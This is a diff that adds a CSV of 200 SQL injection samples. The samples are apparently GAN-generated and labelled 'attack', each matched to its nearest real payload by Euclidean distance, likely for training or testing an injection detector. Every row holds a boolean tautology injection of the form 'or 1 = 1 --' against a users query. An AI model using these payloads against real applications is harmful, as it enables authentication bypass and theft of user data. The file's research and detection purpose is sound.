@@ -1,0 +1,201 @@
+id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
+GAN_000001,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.69912173795744
+GAN_000002,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,2.9654969862501197
+GAN_000003,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.1602491352959596
+GAN_000004,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.4708658430544443
+GAN_000005,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.4198164760204444
+GAN_000006,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.7147290304221348
+GAN_000007,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.0766957722999955
+GAN_000008,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.519991113681277
+GAN_000009,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.5865568222499293
+GAN_000010,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.47473427599201
+GAN_000011,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.2635745825251945
+GAN_000012,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.5172938710522668
+GAN_000013,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.0099406671968323
+GAN_000014,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.268470283004097
+GAN_000015,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.3840551290805285
+GAN_000016,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.2045532807629558
+GAN_000017,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.123048844011065
+GAN_000018,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.4929157284471546
+GAN_000019,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.484280653005034
+GAN_000020,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.601055957954856
+GAN_000021,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.7836902193216546
+GAN_000022,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.3330798720940815
+GAN_000023,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.2158692585547364
+GAN_000024,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.7312411739183617
+GAN_000025,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.6808098255075685
+GAN_000026,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.048827119795027
+GAN_000027,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.1820657214027612
+GAN_000028,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.4754014616624405
+GAN_000029,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.1035134961682553
+GAN_000030,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.1314718922437157
+GAN_000031,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.116533156944086
+GAN_000032,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.0880504912024413
+GAN_000033,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.0971838205475466
+GAN_000034,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.3666688708060417
+GAN_000035,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.509707994418474
+GAN_000036,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000164,3.390897975986493
+GAN_000037,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.317229702288127
+GAN_000038,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.5185837949540866
+GAN_000039,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,2.9287744127695587
+GAN_000040,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.295077994126159
+GAN_000041,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.1956223826429833
+GAN_000042,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.08008185331064
+GAN_000043,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.2085762072719652
+GAN_000044,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.5920714940752676
+GAN_000045,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.025734139214537
+GAN_000046,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.9871232541827863
+GAN_000047,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000177,3.2628073204610035
+GAN_000048,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.178536923088263
+GAN_000049,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.439802656665278
+GAN_000050,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.2371768243476544
+GAN_000051,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.4648925633185286
+GAN_000052,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.1637322557658494
+GAN_000053,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.54358757166636
+GAN_000054,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.196986232077906
+GAN_000055,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.0697133194784643
+GAN_000056,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.63214209684599
+GAN_000057,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,2.9893046622304653
+GAN_000058,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.166425452020644
+GAN_000059,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.151352719971852
+GAN_000060,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.7068685724049244
+GAN_000061,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.3550222044804707
+GAN_000062,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.065658281041858
+GAN_000063,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.0762557938300197
+GAN_000064,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.3000609012538953
+GAN_000065,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.1711123035352617
+GAN_000066,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.290402816442098
+GAN_000067,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.1244063221122764
+GAN_000068,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.2888491044579973
+GAN_000069,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.46445293480801
+GAN_000070,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.1684724430206703
+GAN_000071,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.5603425738426386
+GAN_000072,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.2236695011721417
+GAN_000073,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.042852550996469
+GAN_000074,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.167004099886868
+GAN_000075,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.2202339812769836
+GAN_000076,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.5652705927867783
+GAN_000077,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000177,3.2591903306639107
+GAN_000078,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.3691992174690926
+GAN_000079,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.141669216954135
+GAN_000080,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.1031780862801512
+GAN_000081,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.7635396204805436
+GAN_000082,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.198160631219569
+GAN_000083,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.3645886148574253
+GAN_000084,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.3333553716886266
+GAN_000085,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.095702032245892
+GAN_000086,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.642535456516269
+GAN_000087,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.034346545868844
+GAN_000088,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.4673515266458232
+GAN_000089,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.283776455057048
+GAN_000090,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000177,3.017758473635333
+GAN_000091,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.1031901771599064
+GAN_000092,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.3598251158371037
+GAN_000093,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.3869744596112197
+GAN_000094,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.06794265668478
+GAN_000095,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.1122931487867453
+GAN_000096,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.2365024339982877
+GAN_000097,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.0635428443422414
+GAN_000098,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.0257743404160853
+GAN_000099,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.2646091543621893
+GAN_000100,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.1453878969926277
+GAN_000101,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.416789842342859
+GAN_000102,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.6066098478173485
+GAN_000103,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.493731842179127
+GAN_000104,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.5319764764922326
+GAN_000105,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,2.950770567478766
+GAN_000106,attack,boolean," select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1",nearest_attack_euclidean,R000223,3.2140160170093224
+GAN_000107,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.174686804419132
+GAN_000108,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.124516998958058
+GAN_000109,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,2.97283281585485
+GAN_000110,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.3888087415796626
+GAN_000111,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.3644531713126993
+GAN_000112,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.323355487894195
+GAN_000113,attack,boolean," select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1",nearest_attack_euclidean,R000223,3.261377145912744
+GAN_000114,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.081692911546808
+GAN_000115,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.4371132658007206
+GAN_000116,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.167928417068702
+GAN_000117,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.4200247599620868
+GAN_000118,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.1448734311200166
+GAN_000119,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.4906587370296496
+GAN_000120,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.305610633428205
+GAN_000121,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.4305399755778065
+GAN_000122,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.1896862725371755
+GAN_000123,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.6419505728841837
+GAN_000124,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.058947571080597
+GAN_000125,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.1322728810649036
+GAN_000126,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.244176574594273
+GAN_000127,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.4550813709331605
+GAN_000128,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.3140354829959007
+GAN_000129,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.566354969511261
+GAN_000130,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.180331086922272
+GAN_000131,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.050458620935102
+GAN_000132,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000177,3.63504872460224
+GAN_000133,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.205889377749137
+GAN_000134,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.0835394065425126
+GAN_000135,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.654397443443723
+GAN_000136,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.1827946608449613
+GAN_000137,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.3229895589772145
+GAN_000138,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.4324270881228562
+GAN_000139,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.0935555772073604
+GAN_000140,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.0672929897965884
+GAN_000141,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.139450798993989
+GAN_000142,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.663107117626627
+GAN_000143,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.025823750857757
+GAN_000144,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.536584627399836
+GAN_000145,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.4832761023090506
+GAN_000146,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.3257287949294345
+GAN_000147,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.1219443767123263
+GAN_000148,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.2427123228136003
+GAN_000149,attack,boolean," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000139,3.0752766647640537
+GAN_000150,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.509269568364907
+GAN_000151,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.506790681120699
+GAN_000152,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.472829182219547
+GAN_000153,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.191009403983565
+GAN_000154,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.161545146918701
+GAN_000155,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.5212632016410677
+GAN_000156,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.6385097118608263
+GAN_000157,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.4002798005540136
+GAN_000158,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.071809046182172
+GAN_000159,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,3.3189286306900025
+GAN_000160,attack,boolean,select * from users where id  =  1   or 1  =  1 -- 1,nearest_attack_euclidean,R000046,3.6591657380723057
+GAN_000161,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.1447002252201735
+GAN_000162,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.054612374812844
+GAN_000163,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.300353205370523
+GAN_000164,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.179275192001159
+GAN_000165,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.108376336825317
+GAN_000166,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.50716212272653
+GAN_000167,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.2626131176619486
+GAN_000168,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.22372716596611
+GAN_000169,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.4169489526588914
+GAN_000170,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.3844477193625373
+GAN_000171,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.1573034267672
+GAN_000172,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.0103223457267014
+GAN_000173,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.242318815874776
+GAN_000174,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.0528436770385228
+GAN_000175,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.592979216441491
+GAN_000176,attack,boolean," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000268,3.534318499290549
+GAN_000177,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.183740390665697
+GAN_000178,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.217423400110333
+GAN_000179,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.381215086932196
+GAN_000180,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.5725744933956505
+GAN_000181,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.3409971561854857
+GAN_000182,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.307809668334473
+GAN_000183,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.1069270434742706
+GAN_000184,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.249471674201722
+GAN_000185,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.3483367194866727
+GAN_000186,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.8541012412333444
+GAN_000187,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000177,3.1469384974881085
+GAN_000188,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.3963967134198247
+GAN_000189,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.132839688144048
+GAN_000190,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.167727948906087
+GAN_000191,attack,boolean," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000246,2.979594879593165
+GAN_000192,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.186475252137545
+GAN_000193,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000177,3.0408681135564386
+GAN_000194,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.0727717107811587
+GAN_000195,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.5045115364407704
+GAN_000196,attack,boolean," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000136,3.295764719629798
+GAN_000197,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.7063840768086704
+GAN_000198,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,3.305280590952615
+GAN_000199,attack,boolean," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",nearest_attack_euclidean,R000067,3.3162729566588083
+GAN_000200,attack,boolean,select * from users where id  =  1. or 1  =  1 -- 1,nearest_attack_euclidean,R000094,3.095421849863322
